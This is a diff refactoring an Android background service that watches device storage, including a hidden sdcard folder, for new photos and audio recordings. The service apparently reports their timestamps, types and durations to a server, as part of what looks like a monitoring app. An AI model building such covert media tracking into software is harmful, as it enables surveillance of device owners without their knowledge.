@@ -16,11 +16,11 @@ import android.os.Environment;
 import android.os.IBinder;
 import android.util.Log;
 
-import com.inet.android.request.ConstantValue;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.ValueWork;
 import com.loopj.android.http.RequestParams;
 
 public class FileObserverService extends Service {
@@ -61,9 +61,9 @@ public class FileObserverService extends Service {
 		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
 				servicePendingIntent);
 
-		isImageObserver = ValueWork.getState(ConstantValue.TYPE_IMAGE_REQUEST,
+		isImageObserver = AppSettings.getState(AppConstants.TYPE_IMAGE_REQUEST,
 				this);
-		isAudioObserver = ValueWork.getState(ConstantValue.TYPE_AUDIO_REQUEST,
+		isAudioObserver = AppSettings.getState(AppConstants.TYPE_AUDIO_REQUEST,
 				this);
 
 		if (isImageObserver == 0 && isAudioObserver == 0) {
@@ -104,7 +104,7 @@ public class FileObserverService extends Service {
 		String sdcardSd = "/sdcard/.externalSD";
 
 		List<String> dirList = new ArrayList<String>();
-		List<String> folder = new ArrayList<String>();
+//		List<String> folder = new ArrayList<String>();
 		dirList.add(sdcard);
 		dirList.add(sdcard2);
 		dirList.add(sdcardMnt);
@@ -150,24 +150,24 @@ public class FileObserverService extends Service {
 				Logging.doLog(LOG_TAG, "image:" + path, "image:" + path);
 
 				if (event == FileObserver.CREATE)
-					ValueWork.setLastImageFile(path);
+					AppSettings.setLastImageFile(path);
 				else if (event == FileObserver.CLOSE_WRITE) {
 					Logging.doLog(LOG_TAG, "Last image "
-							+ ValueWork.getLastImageFile().equals(path),
+							+ AppSettings.getLastImageFile().equals(path),
 							"Last image "
-									+ ValueWork.getLastImageFile().equals(path));
+									+ AppSettings.getLastImageFile().equals(path));
 
-					if (ValueWork.getLastImageFile().equals(path)
+					if (AppSettings.getLastImageFile().equals(path)
 							&& isImageObserver == 1) {
 						try {
 							TimeUnit.MILLISECONDS.sleep(1000);
 						} catch (InterruptedException e) {
 							e.printStackTrace();
 						}
-						ValueWork.setLastImageFile("null");
+						AppSettings.setLastImageFile("null");
 					} else
 						return;
-					typeValue = ConstantValue.TYPE_IMAGE_REQUEST;
+					typeValue = AppConstants.TYPE_IMAGE_REQUEST;
 					Logging.doLog(LOG_TAG, "data[image]", "data[image]");
 				}
 			}
@@ -178,12 +178,12 @@ public class FileObserverService extends Service {
 				Logging.doLog(LOG_TAG, "data[audio]: " + event + " " + path,
 						"data[audio]: " + event + "image:" + path);
 				if (event == FileObserver.CREATE)
-					ValueWork.setLastCreateAudioFile(path);
+					AppSettings.setLastCreateAudioFile(path);
 				else if (event == FileObserver.CLOSE_WRITE) {
-					if (ValueWork.getLastCreateAudioFile().equals(path)) {
-						typeValue = ConstantValue.TYPE_AUDIO_REQUEST;
+					if (AppSettings.getLastCreateAudioFile().equals(path)) {
+						typeValue = AppConstants.TYPE_AUDIO_REQUEST;
 					} else
-						ValueWork.setLastAudioFile(path);
+						AppSettings.setLastAudioFile(path);
 				}
 			}
 			if (typeValue != -1) {
@@ -191,7 +191,7 @@ public class FileObserverService extends Service {
 				try {
 					params.put("data[][time]", ConvertDate.logTime());
 					params.put("data[][type]", typeValue);
-					if (typeValue == ConstantValue.TYPE_AUDIO_REQUEST) {
+					if (typeValue == AppConstants.TYPE_AUDIO_REQUEST) {
 						int second = getDuration(path);
 						if (second != -1)
 							params.put("data[][duration]", second);
